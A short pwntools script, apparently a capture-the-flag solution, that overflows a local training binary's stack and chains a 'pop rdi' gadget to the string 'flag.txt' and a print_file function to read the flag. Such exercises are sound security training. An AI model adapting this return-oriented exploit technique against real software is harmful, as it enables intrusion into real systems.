#!/usr/bin/env python3

from pwn import *
from typing import Union, List

elf = ELF("./challenge", checksec=False)

def get_gadget(elf: ELF, instructions: Union[list, tuple]) -> bytes:
    gadget = ROP(elf).find_gadget(instructions)
    return p64(gadget.address)

def search_strings(elf: ELF, string: Union[bytes, str]) -> List[bytes]:
    strings = elf.search(bytes(string, 'ascii'))
    return [p64(s) for s in strings]

payload = cyclic(40)
payload += get_gadget(elf, ['pop rdi', 'ret'])
payload += search_strings(elf, 'flag.txt')[0]
payload += p64(elf.symbols.print_file)

p = process("./challenge") # remote('localhost', 1101) #

p.sendline(payload)

print(p.recvall())
